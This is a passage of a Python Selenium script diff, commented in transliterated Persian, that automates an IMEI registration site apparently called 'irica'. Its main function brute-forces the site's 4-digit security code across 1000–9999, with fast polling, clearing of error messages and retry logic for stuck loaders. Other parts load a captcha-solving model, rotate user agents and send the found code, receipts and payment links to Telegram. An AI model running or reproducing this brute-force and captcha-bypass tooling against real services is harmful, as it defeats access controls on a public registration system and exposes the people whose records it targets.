+    driver.execute_script(
+        "const el=arguments[0], v=arguments[1];"
+        "el.value=v;"
+        "el.dispatchEvent(new Event('input',{bubbles:true}));"
+        "el.dispatchEvent(new Event('change',{bubbles:true}));"
+        "el.dispatchEvent(new Event('blur',{bubbles:true}));",
+        el, value)
+
+
+def type_and_verify(driver, wicketpath, value, tries=3):
+    """Field ra por mikonad va MOTMAEN mishavad meghdar neshaste. Aval ba tayp-e
+    vaghe'i (send_keys), agar nachasbid ba JS. Barmigardanad: True agar meghdar
+    dar nahayat dorost bood.
+
+    Baraye captcha zaruri-st: type_field-e sade momken ast bi-seda shekast bokhorad
+    (AJAX pak konad / focus napazirad) va ma bi-khabar bemanim."""
+    for i in range(tries):
+        try:
+            el = find(driver, wicketpath)
+        except Exception:
+            time.sleep(0.3)
+            continue
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+        time.sleep(0.15)
+        try:
+            if i == 0:
+                # ravesh-e 1: tayp-e vaghe'i
+                try:
+                    el.click()
+                except Exception:
+                    driver.execute_script("arguments[0].focus();", el)
+                el.clear()
+                el.send_keys(value)
+            else:
+                # ravesh-e 2 (fallback): JS + dispatch
+                set_field_js(driver, el, value)
+        except StaleElementReferenceException:
+            continue
+        except Exception:
+            pass
+        time.sleep(0.3)
+        # verify
+        try:
+            cur = (find(driver, wicketpath).get_attribute("value") or "").strip()
+        except Exception:
+            cur = ""
+        if cur == value:
+            return True
+        print(f">>> HOSHDAR: field {wicketpath!r} hanooz {cur!r} ast (entezar: {value!r}) "
+              f"— talash #{i + 2}")
+    return False
+
+
+def ensure_checked(driver, el):
+    if not el.is_selected():
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+        time.sleep(0.2)
+        try:
+            el.click()
+        except Exception:
+            driver.execute_script("arguments[0].click();", el)
+
+
+def ensure_checked_touch(driver, el, tries=6):
+    """Checkbox-e Wicket-ra dar halat-e MOBILE-EMULATION tik mizanad.
+
+    MOHEM (dars-e Wicket): .click()-e Selenium va JS .click() roo-ye element-haye
+    in site DAR HALAT-e mobile JAVAB NEMIDAHAND. Pas mesl-e dokme-ha bayad zanjire-ye
+    kamel-e touch/pointer/mouse-ra dispatch konim. Ba'd az har talash check mikonim
+    ke checked shode ya na, va agar na -> dobare.
+
+    NOKTE: in checkbox class-e 'clip-check' darad (input-e makhfi + label-e tazeini).
+    Pas zanjire-ye event-ra HAM roo-ye khod-e input VA HAM roo-ye .row-e valedeyn
+    (nahiye-ye qabl-e click) shellik mikonim, va dar akhar checked-ra mostaghim set
+    mikonim ta hatman submit shavad.
+
+    Barmigardanad True agar dar akhar checked shode bashad."""
+    _CHAIN = r"""
+      var b = arguments[0];
+      var r = b.getBoundingClientRect();
+      var cx = r.left + r.width/2, cy = r.top + r.height/2;
+      function ev(type, C){ var e = new C(type, {bubbles:true,
+        cancelable:true, clientX:cx, clientY:cy, view:window});
+        b.dispatchEvent(e); }
+      try{ var t=new Touch({identifier:1, target:b, clientX:cx, clientY:cy});
+        b.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,
+          cancelable:true, touches:[t], targetTouches:[t], changedTouches:[t]}));
+        b.dispatchEvent(new TouchEvent('touchend',{bubbles:true,
+          cancelable:true, touches:[], targetTouches:[], changedTouches:[t]}));
+      }catch(e){}
+      try{ ev('pointerdown', PointerEvent); ev('pointerup', PointerEvent); }catch(e){}
+      ev('mousedown', MouseEvent); ev('mouseup', MouseEvent); ev('click', MouseEvent);
+    """
+    for i in range(tries):
+        try:
+            if el.is_selected():
+                return True
+        except Exception:
+            pass
+        try:
+            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+        except Exception:
+            pass
+        # zanjire-ye kamel-e touch/pointer/mouse roo-ye INPUT
+        try:
+            driver.execute_script(_CHAIN, el)
+        except Exception:
+            pass
+        # va HAM roo-ye .row-e valedeyn (nahiye-ye click-e vaghe'i-ye clip-check)
+        try:
+            parent = driver.execute_script(
+                "return arguments[0].closest('.row')||arguments[0].parentElement;", el)
+            if parent:
+                driver.execute_script(_CHAIN, parent)
+        except Exception:
+            pass
+        time.sleep(0.25)
+        try:
+            if el.is_selected():
+                return True
+        except Exception:
+            pass
+    # akharin talash-e mostaghim: checked-ra set kon + event (ta hatman POST shavad)
+    try:
+        driver.execute_script(
+            "arguments[0].checked = true;"
+            "arguments[0].dispatchEvent(new Event('click',{bubbles:true}));"
+            "arguments[0].dispatchEvent(new Event('change',{bubbles:true}));", el)
+    except Exception:
+        pass
+    try:
+        return el.is_selected()
+    except Exception:
+        return False
+
+
+def brute_force_security_code(driver, dbg=None, title="", national="", imei="",
+                              start=1000, end=9999):
+    """MARHALE-ye 5: kod-e amniati-ye 4-raqami-ra (ke NEMIDANIM) BRUTE-FORCE mikonad.
+
+    NOKTE-ye MOHEM: kod HAMISHE 4-raqam ast va HAMISHE az 1000 shoru' mishavad
+    (raqam-e avval sefr NIST), pas 0000..0999-ra emtehan NEMIKONIM (start=1000).
+    code_s ba f"{code:04d}" 4-raqam neveshte mishavad ta agar rooz-i start-ra
+    kamtar bezari (mesl-e 42) ham 0042 submit shavad, na '42'.
+
+    Ravand (halghe-ye SARI'):
+      - YEK BAR tik-e taahhod (confirmCheck) ra mizanad.
+      - baraye har kod az start..end:
+          1) panel-e khata-ye ghabli ra AZ DOM PAK mikonad (ta ba khata-ye kohne
+             eshtebah nagirim).
+          2) checkField ra ba JS + event-e input por mikonad (sari').
+          3) dokme-ye 'end' ra ba fire_refresh_events mizanad (AjaxButton).
+          4) SARI' poll mikonad (~30ms) ta yeki az inha:
+               - matn-e 'کد امنیتی صحیح نمی باشد' zaher shavad -> GHALAT, boro kod-e ba'd.
+               - dokme-ye 'end' napadid shavad / errorPanel-e digar / feedback-e
+                 movaffaghiat -> DOROST! tavaghof.
+      - agar hame-ye kodha ghalat bud -> False (main safhe-ra baz negah midarad).
+
+    Barmigardanad: (found_code | None). agar peyda shod, safhe roo-ye marhale-ye
+    ba'd ast (in tabe HICH dokme-ye digari nemizanad)."""
+    wait_field_deadline = time.time() + 20
+    while time.time() < wait_field_deadline:
+        if driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_SCS_CHECK}"]'):
+            break
+        time.sleep(0.2)
+    else:
+        print(">>> (securityCodeStep: checkField nayamad — HTML/screenshot-ra check kon.)")
+        return None
+
+    if dbg:
+        dbg.notify("marhale-ye 5: BRUTE-FORCE-e kod-e amniati (1000..9999)")
+
+    # 1) tik-e taahhod — YEK BAR (ba zanjire-ye touch/pointer, chon .click() dar
+    #    halat-e mobile roo-ye checkbox-e Wicket kar NEMIKONAD)
+    checked_ok = False
+    try:
+        chk = find(driver, WP_SCS_CONFIRM)
+        checked_ok = ensure_checked_touch(driver, chk)
+        print(f">>> tik-e taahhod zade shod (checked={checked_ok})")
+    except Exception as e:
+        print(f">>> HOSHDAR: tik-e taahhod zade nashod: {e}")
+
+    # agar tik NAKHORD, brute-force bi-faayede ast (site 'kod-e amniati' ra bررسی
+    # nemikonad ta taahhod tik nakhord). yek talash-e digar ba peyda-kardan-e dobare.
+    if not checked_ok:
+        for _ in range(3):
+            time.sleep(0.4)
+            try:
+                chk = find(driver, WP_SCS_CONFIRM)
+                if ensure_checked_touch(driver, chk):
+                    checked_ok = True
+                    print(">>> tik-e taahhod dar talash-e dobare zade shod.")
+                    break
+            except Exception:
+                pass
+        if not checked_ok:
+            print(">>> ⚠ HOSHDAR: chackbox-e taahhod TIK NAKHORD — "
+                  "brute-force momken ast bi-natije bashad.")
+
+    # JS-e por-kardan + click + khandan-e natije dar YEK raft-o-bargasht (kamtarin latency).
+    #   input:  checkField = kod
+    #   click:  zanjire-ye touch/pointer/mouse roo-ye 'end' (mesl-e fire_refresh_events)
+    # in ba fire_refresh_events-e python farق darad: injas hame-chiz yekja dar
+    # execute_script ejra mishavad ta bar-o-bargasht-e webdriver kam shavad.
+    _FIRE_JS = r"""
+      var codeWp = arguments[0], endWp = arguments[1];
+      var f = document.querySelector('[wicketpath="'+codeWp+'"]');
+      var b = document.querySelector('[wicketpath="'+endWp+'"]');
+      if(!f || !b) return false;
+      f.value = arguments[2];
+      f.dispatchEvent(new Event('input',{bubbles:true}));
+      f.dispatchEvent(new Event('change',{bubbles:true}));
+      var r = b.getBoundingClientRect();
+      var cx = r.left + r.width/2, cy = r.top + r.height/2;
+      function ev(type, C){ var e = new C(type, {bubbles:true, cancelable:true,
+        clientX:cx, clientY:cy, view:window}); b.dispatchEvent(e); }
+      try{ var t=new Touch({identifier:1, target:b, clientX:cx, clientY:cy});
+        b.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,cancelable:true,
+          touches:[t], targetTouches:[t], changedTouches:[t]}));
+        b.dispatchEvent(new TouchEvent('touchend',{bubbles:true,cancelable:true,
+          touches:[], targetTouches:[], changedTouches:[t]}));
+      }catch(e){}
+      try{ ev('pointerdown', PointerEvent); ev('pointerup', PointerEvent); }catch(e){}
+      ev('mousedown', MouseEvent); ev('mouseup', MouseEvent); ev('click', MouseEvent);
+      return true;
+    """
+
+    # error-ra pak kon: har feedbackPanel-e error/errorPanel-e securityCodeStep.
+    _CLEAR_ERR_JS = r"""
+      var wp = arguments[0];
+      var p = document.querySelector('[wicketpath="'+wp+'"]');
+      if(p) p.innerHTML = '';
+      // feedbackPanel-e error-e sath-e form ham (ja-ye asli-ye 'کد ... نمی باشد')
+      document.querySelectorAll(
+        '[wicketpath$="feedBack_container_error"] .feedbackPanel, '+
+        '[wicketpath$="feedBack_container_error"] ul').forEach(function(e){
+          e.parentNode && e.parentNode.removeChild(e);});
+      return true;
+    """
+
+    # natije-ra bekhan: {v:0/1/2, other:''}
+    #   v=0 -> hanooz hich | v=1 -> GHALAT (payam-e kod-e amniati) | v=2 -> DOROST
+    #   other -> matn-e HAR khata-ye DIGAR (gheyr az kod-e amniati) baraye LOG.
+    _POLL_JS = r"""
+      var endWp = arguments[0], badMsg = arguments[1];
+      var out = {v:0, other:''};
+      // hame-ye payam-haye error-ra jam' kon
+      var msgs = document.querySelectorAll(
+        '[wicketpath$="feedBack_container_error"] li, '+
+        '[wicketpath$="feedBack_container_error"] span[wicketpath$="_message"], '+
+        '[wicketpath$="securityCodeStep_errorPanel"]');
+      var badSeen = false;
+      for(var i=0;i<msgs.length;i++){
+        var t=(msgs[i].innerText||'').trim();
+        if(!t) continue;
+        if(t.indexOf(badMsg)>=0){ badSeen = true; }
+        else { out.other += (out.other?' | ':'') + t; }  // khata-ye DIGAR
+      }
+      // 1) payam-e 'کد امنیتی صحیح نمی باشد' amad? -> GHALAT
+      if(badSeen){ out.v = 1; return out; }
+      // 2) dokme-ye 'end' hanooz hast? agar NIST -> raftim jelo (DOROST)
+      var b = document.querySelector('[wicketpath="'+endWp+'"]');
+      if(!b){ out.v = 2; return out; }
+      // 3) feedback-e MOVAFFAGHIAT (success) neshast?
+      var suc = document.querySelector(
+        '[wicketpath$="feedBack_container_success"] li, '+
+        '[wicketpath$="feedBack_container_success"] .feedbackPanel');
+      if(suc && (suc.innerText||'').trim()){ out.v = 2; return out; }
+      // 4) khata-ye DIGAR bud (na kod-e amniati) vali dokme hanooz hast:
+      //    verdict=0 (edame midahim) vali 'other'-ra bar-migardanim ta LOG shavad.
+      return out;
+    """
+
+    # AJAX dar jaryan ast? (loader-e 'indicatorImg' namayan ast YA dokme-ye 'end'
+    # disabled shode). ta busy ast NABAYAD kod-e ba'di-ra bezanim (vagarna roo-ye
+    # yek request-e dar-jaryan click mishavad va pasokh-ha qati/gom mishavand).
+    _BUSY_JS = r"""
+      var endWp = arguments[0];
+      var b = document.querySelector('[wicketpath="'+endWp+'"]');
+      if(b && (b.disabled || (' '+(b.className||'')+' ').indexOf(' disabled ')>=0))
+        return true;
+      var ind = document.querySelectorAll(
+        '.wicket-ajax-indicator, [wicketpath$="indicator_indicatorImg"]');
+      for(var j=0;j<ind.length;j++){ if(ind[j].offsetParent !== null) return true; }
+      return false;
+    """
+
+    # agar loader GIR kard: dar field-e kod yek ENTER mizanim -> safhe hamun-ja
+    # refresh mishavad va loader az bein miravad (rahkar-e karbar).
+    _ENTER_JS = r"""
+      var codeWp = arguments[0];
+      var f = document.querySelector('[wicketpath="'+codeWp+'"]');
+      if(!f) return false;
+      f.focus();
+      var opts = {bubbles:true, cancelable:true, key:'Enter', code:'Enter',
+                  keyCode:13, which:13, view:window};
+      f.dispatchEvent(new KeyboardEvent('keydown', opts));
+      f.dispatchEvent(new KeyboardEvent('keypress', opts));
+      f.dispatchEvent(new KeyboardEvent('keyup', opts));
+      return true;
+    """
+
+    def _scs_busy():
+        try:
+            return bool(driver.execute_script(_BUSY_JS, WP_SCS_END))
+        except Exception:
+            return False
+
+    def _wait_not_busy(timeout, stuck_after=None):
+        """Sabr ta AJAX tamam shavad (busy=False). agar 'stuck_after' saniye busy
+        bemAnad, dar field-e kod ENTER mizanim ta loader-e GIR-karde az bein beravad.
+        Barmigardanad True agar dar akhar busy NABASHAD."""
+        t_start = time.time()
+        dl = t_start + timeout
+        entered = False
+        while time.time() < dl:
+            if not _scs_busy():
+                return True
+            # loader moddat-e ziad mande? -> ENTER (yek bar) baraye refresh
+            if (stuck_after is not None and not entered
+                    and (time.time() - t_start) > stuck_after):
+                try:
+                    driver.execute_script(_ENTER_JS, WP_SCS_CHECK)
+                    print(">>> (loader GIR karde bود — ENTER dar field-e kod baraye "
+                          "refresh zade shod.)")
+                except Exception:
+                    pass
+                entered = True
+            time.sleep(0.1)
+        return not _scs_busy()
+
+    t0 = time.time()
+    logged_others = set()  # matn-e khata-haye DIGAR ke ghablan LOG shode (ta tekrari nashavad)
+    code_retries = {}      # code_s -> chand bar be khatere loader-e GIR-karde retry shode
+    # sf-e emtehan: kodha be tartib; kod-i ke loader-esh GIR kard, dobare TE-ye sf
+    # ezafe mishavad (ta az dast naravad). deque bala import shode.
+    pending = deque(range(start, end + 1))
+    n = -1
+    while pending:
+        code = pending.popleft()
+        n += 1
+        code_s = f"{code:04d}"   # HAMISHE 4-raqam ba sefr-e ebtedaee (0042, 0400, ...)
+        # 0) har 200 kod, motmaen sho tik-e taahhod HANOOZ hast (agar AJAX-e site
+        #    reset-esh karde bashad, dobare mizanim). in az fajee'e-ye "400 kod-e
+        #    bi-asar chون tik nabود" jelogiri mikonad.
+        if n % 200 == 0:
+            try:
+                chk = find(driver, WP_SCS_CONFIRM)
+                if not chk.is_selected():
+                    print(f">>> (tik-e taahhod bАz nabود @ kod={code_s} — dobare "
+                          "mizanim.)")
+                    ensure_checked_touch(driver, chk)
+            except Exception:
+                pass
+        # 1) error-e ghabli ra pak kon
+        try:
+            driver.execute_script(_CLEAR_ERR_JS, WP_SCS_ERROR)
+        except Exception:
+            pass
+        # 1.5) SABR ta AJAX-e ghabli tamam shavad (busy nabashad). agar loader GIR
+        #      karde bashad (bish az 4s), ENTER-e refresh zade mishavad.
+        if _scs_busy():
+            _wait_not_busy(timeout=15, stuck_after=4.0)
+        # 2+3) por kon + click (yekja)
+        try:
+            ok = driver.execute_script(_FIRE_JS, WP_SCS_CHECK, WP_SCS_END, code_s)
+            if not ok:
+                # element-ha nistand -> shayad raftim jelo ya safhe avaz shod
+                if not driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_SCS_END}"]'):
+                    print(f">>> dokme-ye 'end' napadid shod (kod={code_s}) — ehtemalan raftim jelo!")
+                    return code_s
+                time.sleep(0.1)
+                continue
+        except Exception as e:
+            print(f">>> (khata dar fire kod={code_s}: {e})")
+            time.sleep(0.05)
+            continue
+
+        # 4) poll-e sari' ta natije. res = {v:0/1/2, other:''}
+        #    ta ~6s (ya ta vaghti busy nist va javab-i nayamad) montazer mimAnim.
+        #    MOHEM: ta vaghti loader (busy) hast, poll edame midahad — pas kod-ra
+        #    'bi-javab' rad nemikonim faghat chون kond bood.
+        res = {"v": 0, "other": ""}
+        pdeadline = time.time() + 6.0
+        while time.time() < pdeadline:
+            time.sleep(0.03)
+            try:
+                res = driver.execute_script(_POLL_JS, WP_SCS_END, SCS_BAD_MSG) \
+                    or {"v": 0, "other": ""}
+            except Exception:
+                res = {"v": 0, "other": ""}
+            if res.get("v"):
+                break
+            # javab nayamad — agar AJAX dige busy NIST, ma'ni-esh in ast ke
+            # server javab-i nadad (nadir); az halghe biroon miravim (rad).
+            # agar HANOOZ busy ast, sabr edame ta javab biayad ya deadline.
+            if not _scs_busy():
+                # forsat-e kutah-e akhar ta payam bineshinad, ba'd biroon
+                time.sleep(0.15)
+                try:
+                    res = driver.execute_script(_POLL_JS, WP_SCS_END, SCS_BAD_MSG) \
+                        or {"v": 0, "other": ""}
+                except Exception:
+                    pass
+                if res.get("v"):
+                    break
+                break
+
+        verdict = res.get("v", 0)
+        other = (res.get("other") or "").strip()
+
+        # HAR KHATA-ye DIGAR (gheyr az 'kod-e amniati') -> DAR LOG bezan (yek bar).
+        if other and other not in logged_others:
+            logged_others.add(other)
+            log_event("warn", f"khata-ye gheyr-az-kod dar securityCodeStep "
+                      f"(kod={code_s}): {other}",
+                      step="marhale-5/securityCodeStep",
+                      title=title, national=national, imei=imei)
+            print(">>> ⚠ khata-ye DIGAR (gheyr az kod-e amniati) — dar log zakhire shod:")
+            print("     " + other.encode("unicode_escape").decode("ascii"))
+
+        if verdict == 2:
+            dt = time.time() - t0
+            print(f">>> ✅ KOD-e DOROST peyda shod: {code_s}  "
+                  f"(ba'd az {n + 1} talash, {dt:.1f}s)")
+            log_event("success", f"kod-e amniati peyda shod: {code_s} "
+                      f"({n + 1} talash, {dt:.1f}s)",
+                      step="marhale-5/securityCodeStep",
+                      title=title, national=national, imei=imei)
+            return code_s
+
+        if verdict == 1:
+            # GHALAT -> log-e sabok har 200 ta (ta console spam nashavad)
+            if (n + 1) % 200 == 0:
+                dt = time.time() - t0
+                rate = (n + 1) / dt if dt else 0
+                print(f">>> ... {n + 1} kod emtehan shod ({code_s}), "
+                      f"{rate:.1f} kod/s, separi: {dt:.0f}s")
+            continue
+
+        # verdict==0: javab-i nayamad. do halat:
+        if not driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_SCS_END}"]'):
+            print(f">>> dokme-ye 'end' napadid shod (kod={code_s}) — raftim jelo!")
+            return code_s
+
+        # agar HANOOZ busy ast -> loader GIR karde. sabr + (dar surat-e mAndegAri)
+        # ENTER-e refresh, va HAMIN kod-ra DOBARE mizanim (ta az dast naravad).
+        if _scs_busy():
+            print(f">>> loader GIR karde (kod={code_s}) — sabr + refresh, ba'd "
+                  f"HAMIN kod dobare zade mishavad ...")
+            _wait_not_busy(timeout=20, stuck_after=4.0)
+            # ba'd az refresh momken ast field/tik reset shavad -> tik-ra check kon
+            try:
+                chk = find(driver, WP_SCS_CONFIRM)
+                if not chk.is_selected():
+                    ensure_checked_touch(driver, chk)
+            except Exception:
+                pass
+            # in kod-ra DOBARE emtehan kon (retry-e mahdud ta 3 bar baraye hamin kod)
+            retries = code_retries.get(code_s, 0)
+            if retries < 3:
+                code_retries[code_s] = retries + 1
+                pending.append(code)   # dobare TE-ye sf begozar ta az dast naravad
+        # dokme hast vali javab nadad (va busy nist) -> edame (kod-e ba'di). log-e kam
+        if (n + 1) % 200 == 0:
+            print(f">>> ... (kod={code_s}) vakonesh-e AJAX kond bود, edame.")
+
+    print(f">>> ⚠ Hame-ye {end - start + 1} kod emtehan shod, hich-kodam dorost nabood.")
+    log_event("warn", f"brute-force-e kod-e amniati na-movaffagh ({start}..{end})",
+              step="marhale-5/securityCodeStep",
+              title=title, national=national, imei=imei)
+    return None
+
+
+def _safe_filename(title):
+    """Title ra baraye esm-e file amniat mikonad (kar-haye gheyr-mojaz ra hazf mikonad)."""
+    import re
+    s = re.sub(r'[\\/:*?"<>|]', '_', str(title or "profile"))
+    return s.strip("_") or "profile"
+
+
+def _full_screenshot(driver, path):
+    """Screenshot-e KAMEL-e safhe (na faghat viewport) ba CDP migirad; agar nashod
+    be save_screenshot-e adi fallback mikonad. barmigardanad True agar movaffagh bud."""
+    try:
+        res = driver.execute_cdp_cmd("Page.captureScreenshot", {
+            "captureBeyondViewport": True,
+            "fromSurface": True,
+        })
+        import base64
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(res["data"]))
+        return True
+    except Exception as e:
+        print(f">>> (CDP full-screenshot na-shod: {e} — fallback be save_screenshot)")
+        try:
+            return bool(driver.save_screenshot(path))
+        except Exception as e2:
+            print(f">>> (save_screenshot ham na-shod: {e2})")
+            return False
+
+
+def handle_receipt_and_payment(driver, title="", national="", imei=""):
+    """Ba'd az movaffaghiat-e kod-e amniati:
+    1) Screenshot-e rasid + ersal be telegram + zakhire dar screenshots/
+    2) Agar dokme-ye pardakht hast -> click -> screenshot-e pish-pardakht
+       + link-e kamel + ersal be telegram + zakhire-ye link dar payment-link-*.txt
+    """
+    import random
+    import telegram_notify as tg
+
+    os.makedirs(_SCREENSHOTS_DIR, exist_ok=True)
+    rand = str(random.randint(10000, 99999))
+    safe = _safe_filename(title)
+
+    # --- 1) Screenshot-e rasid ---
+    shot_receipt = os.path.join(_SCREENSHOTS_DIR, f"{safe}_{rand}_receipt.png")
+    try:
+        if _full_screenshot(driver, shot_receipt):
+            print(f">>> Screenshot-e rasid: {shot_receipt}")
+        else:
+            shot_receipt = None
+    except Exception as e:
+        print(f">>> (screenshot-e rasid na-shod: {e})")
+        shot_receipt = None
+
+    caption_receipt = (
+        f"✅ <b>Sabt-e IMEI movaffagh</b>\n"
+        f"👤 Profile: {title or national}\n"
+        f"📱 IMEI: {imei}\n"
+        f"🔐 Kod-e amniati peyda shod — safhe-ye rasid"
+    )
+    if shot_receipt and os.path.exists(shot_receipt):
+        try:
+            tg.send_photo(shot_receipt, caption=caption_receipt)
+            print(">>> Telegram: screenshot-e rasid ersal shod.")
+        except Exception as e:
+            print(f">>> (ersal-e telegram na-shod: {e})")
+    else:
+        try:
+            tg.send_message(caption_receipt)
+        except Exception as e:
+            print(f">>> (ersal-e telegram na-shod: {e})")
+
+    # --- 2) Dokme-ye pardakht ---
+    pay_btns = driver.find_elements(By.CSS_SELECTOR, f'[wicketpath="{WP_PARDAKHT}"]')
+    if not pay_btns:
+        print(">>> (dokme-ye pardakht peyda nashod — shayad safhe-ye digar ast.)")
+        return
+
+    print(">>> Dokme-ye pardakht peyda shod — click mikonam ...")
+    try:
+        # onclick-e dokme link-ra dar window.location set mikonad; link-ra QABL az click
+        # az onclick mikhanim ta agar safhe avaz shod, link-ra az dast nadahim.
+        onclick = pay_btns[0].get_attribute("onclick") or ""
+        import re as _re
+        m = _re.search(r"window\.location\.href\s*=\s*'([^']+)'", onclick)
+        pay_link = m.group(1) if m else ""
+
+        cc.fire_refresh_events(driver, pay_btns[0])
+        time.sleep(2.5)
+    except Exception as e:
+        print(f">>> (click-e pardakht khata dad: {e})")
+        pay_link = ""
+
+    # agar link az onclick nayamad, az current_url bekhah
+    if not pay_link:
+        try:
+            pay_link = driver.current_url
+        except Exception:
+            pay_link = ""
+
+    # screenshot-e pish-pardakht
+    shot_pay = os.path.join(_SCREENSHOTS_DIR, f"{safe}_{rand}_payment.png")
+    try:
+        if _full_screenshot(driver, shot_pay):
+            print(f">>> Screenshot-e pish-pardakht: {shot_pay}")
+        else:
+            shot_pay = None
+    except Exception as e:
+        print(f">>> (screenshot-e pish-pardakht na-shod: {e})")
+        shot_pay = None
+
+    # zakhire-ye link dar txt
+    link_txt = os.path.join(_SCREENSHOTS_DIR, f"payment-link-{safe}_{rand}.txt")
+    try:
+        with open(link_txt, "w", encoding="utf-8") as f:
+            f.write(pay_link + "\n")
+        print(f">>> Link-e pardakht zakhire shod: {link_txt}")
+    except Exception as e:
+        print(f">>> (zakhire-ye link na-shod: {e})")
+
+    caption_pay = (
+        f"💳 <b>Safhe-ye pish-pardakht</b>\n"
+        f"👤 Profile: {title or national}\n"
+        f"📱 IMEI: {imei}\n"
+        f"🔗 Link:\n<code>{pay_link}</code>"
+    )
+    if shot_pay and os.path.exists(shot_pay):
+        try:
+            tg.send_photo(shot_pay, caption=caption_pay)
+            print(">>> Telegram: screenshot-e pish-pardakht ersal shod.")
+        except Exception as e:
+            print(f">>> (ersal-e telegram na-shod: {e})")
+    else:
+        try:
+            tg.send_message(caption_pay)
+        except Exception as e:
+            print(f">>> (ersal-e telegram na-shod: {e})")
+
+    if pay_link:
+        print(f">>> 🔗 Link-e pardakht: {pay_link}")
+
+
+def main():
+    ap = argparse.ArgumentParser(description="Por kardan-e form-e irica (bedun-e submit)")
+    ap.add_argument("--national", help="kod-e melli-ye mosafer")
+    ap.add_argument("--birth", help="tarikh-e tavallod, format-e shamsi mesl 1375/04/29")
+    ap.add_argument("--mobile", help="shomare-ye telefon-e hamrah (marhale-ye 4)")
+    ap.add_argument("--imei", action="append", default=None,
+                    help="kod-e IMEI-ye dastgah (15 raqam). Baraye chand IMEI "
+                         "chand bar bede: --imei AAA --imei BBB")
+    ap.add_argument("--ckpt", default=_DEFAULT_CKPT)
+    ap.add_argument("--no-confirm-check", action="store_true",
+                    help="tik-e 'ghabool daram' ra nazan")
+    ap.add_argument("--submit", action="store_true",
+                    help="dokme-ye 'edame' ra KHODKAR bezan (submit-e vaghe'i)")
+    ap.add_argument("--debugging", action="store_true",
+                    help="halat-e debug: ghabl az har marhale-ye asasi ta zadan-e "
+                         "dokme-ye 'Next action' (balaye safhe) sabr mikonad")
+    ap.add_argument("--manual-manage", action="store_true",
+                    help="safhe-ye avval ra baz kon; karbar dasti ta kod-e 4-raqami "
+                         "miravad, tik mizanad, dokme-ye balaye safhe -> brute-force")
+    args = ap.parse_args()
+
+    # 1) manba'-e asli: inputs.json (ke panel.py mineveshtash). 2) CLI-args override.
+    # 3) agar hich-kodam nabood -> input-e dasti.
+    panel = load_panel_inputs()
+
+    # switch-haye panel (faghat agar dar CLI sarih dade nashode bashand override mishavand)
+    # QABL az vorudi-ha: manual_manage momken ast bedun-e melli/birth/imei kar konad.
+    if not args.no_confirm_check and panel.get("no_confirm_check"):
+        args.no_confirm_check = True
+    if not args.submit and panel.get("submit"):
+        args.submit = True
+    if not args.debugging and panel.get("debugging"):
+        args.debugging = True
+    if not args.manual_manage and panel.get("manual_manage"):
+        args.manual_manage = True
+
+    national = args.national or panel.get("national") or ""
+    birth    = args.birth    or panel.get("birth")    or ""
+    mobile   = args.mobile   or panel.get("mobile")   or ""
+    mobile   = str(mobile).strip()
+    # onvan-e profile (baraye log-ha). agar khali bud -> kod-e melli.
+    title    = str(panel.get("title") or "").strip() or (str(national).strip() or "manual")
+
+    imeis = args.imei or panel.get("imeis") or None
+    if not imeis:
+        imeis = []
+    imeis = [str(x).strip() for x in imeis if x and str(x).strip()]
+    # dual-SIM: ta 2 IMEI (sim1 + sim2). bishtar ra nadide begir.
+    if len(imeis) > 2:
+        print(f">>> HOSHDAR: bishtar az 2 IMEI dade shod — faghat 2-ye aval "
+              f"({imeis[:2]}) estefade mishavad; baghi ({imeis[2:]}) nadide.")
+        imeis = imeis[:2]
+    # alias baraye log-ha / marhale-haye ba'di ke hanooz yek serial mikhanand
+    imei = imeis[0] if imeis else ""
+
+    # dar halat-e automatic: vorudi-ha bayad kamel bashand (ya input dasti)
+    if not args.manual_manage:
+        if not national:
+            national = input("kod-e melli: ").strip()
+        if not birth:
+            birth = input("tarikh-e tavallod (1375/04/29): ").strip()
+        if not imeis:
+            one = input("kod-e IMEI: ").strip()
+            if one:
+                imeis = [one]
+                imei = one
+        title = str(panel.get("title") or "").strip() or (national or "")
+
+    print(f">>> Vorudi-ha: melli={national!r} birth={birth!r} imeis={imeis!r} "
+          f"(n={len(imeis)}) mobile={mobile!r} confirm_tik={not args.no_confirm_check} "
+          f"submit={args.submit} debugging={args.debugging} "
+          f"manual_manage={args.manual_manage}")
+    if not args.manual_manage and not (national and birth and imeis):
+        print(">>> KHATA: vorudi-ha kamel nist. Aval panel.py ra ejra kon va zakhire kon.")
+        return
+
+    solver = None
+    if not args.manual_manage:
+        print(">>> Load-e model ...")
+        solver = load_solver(ckpt=args.ckpt, device="cpu")
+
+    # site-e irica ba'zi vaghtha khata-ye gozara midahad (timeout / ERR_CONNECTION_RESET)
+    # ya safhe-ra NAQES load mikonad. MAX_TRY = te'dad-e restart-e kamel-e Chrome.
+    # dar har talash, chand bar get/F5-e SARI' roo-ye HAMUN driver ghabl az quit.
+    MAX_TRY = 20
+    PAGE_LOAD_SEC = 12          # qablan 25 — agar site baz nashod zood-tar fail + retry
+    CAPTCHA_WAIT_SEC = 10
+    OPEN_GET_TRIES = 4          # chand bar get/F5 dar yek session ghabl az restart
+    driver = None
+    for attempt in range(1, MAX_TRY + 1):
+        try:
+            ua = cc.USER_AGENTS[(attempt - 1) % len(cc.USER_AGENTS)]
+            print(f">>> [talash {attempt}/{MAX_TRY}] Baz kardan-e site ...")
+            # MOHEM: driver-ra JODA misazim va FOWRAN be 'driver' nesbat midahim,
+            # ba'd khod-eman get/timeout-ra seda mizanim. (cc.open_site avval
+            # driver misakht va ba'd get mikard; agar get khata midad -e.g.
+            # ERR_CONNECTION_RESET- exception qabl az return partab mishod va
+            # morurgar-e sakhte-shode YATIM mimand -> ru-ye ham chand Chrome baz
+            # mimand. hala handle hamishe dast-e mast va driver.quit()-e handler
+            # oon-ra mibandad.)
+            driver = cc.build_driver(ua)
+            try:
+                driver.set_page_load_timeout(PAGE_LOAD_SEC)
+            except Exception:
+                pass
+            wait = WebDriverWait(driver, CAPTCHA_WAIT_SEC)
+            opened = False
+            last_open_err = None
+            for og in range(1, OPEN_GET_TRIES + 1):
+                try:
+                    print(f">>>   open/get #{og}/{OPEN_GET_TRIES} "
+                          f"(timeout={PAGE_LOAD_SEC}s) ...")
+                    try:
+                        driver.get(cc.URL)
